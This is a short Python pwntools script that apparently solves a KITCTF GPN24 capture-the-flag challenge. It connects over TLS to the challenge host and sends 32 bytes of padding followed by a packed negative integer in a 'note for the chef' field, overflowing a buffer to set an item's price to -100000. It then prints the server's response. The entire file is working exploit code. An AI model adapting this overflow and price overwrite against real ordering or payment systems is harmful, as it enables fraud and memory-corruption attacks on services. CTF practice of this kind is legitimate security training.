from pwn import *

host = 'flash-fried-truffle-crusted-with-braised-pesto-m766.gpn24.ctf.kitctf.de'
port = 443

p = remote(host, port, ssl=True, sni=True)

padding = b"A" * 32 

negative_price = p32(-100000, sign=True) 

payload = padding + negative_price

p.recvuntil(b"Select item")

p.sendline(b"1")

p.recvuntil(b"Any note for the chef")

p.sendline(payload)

p.recvuntil(b"Select item")

p.sendline(b"0")

output = p.recvall()

print(output.decode('utf-8', 'ignore'))
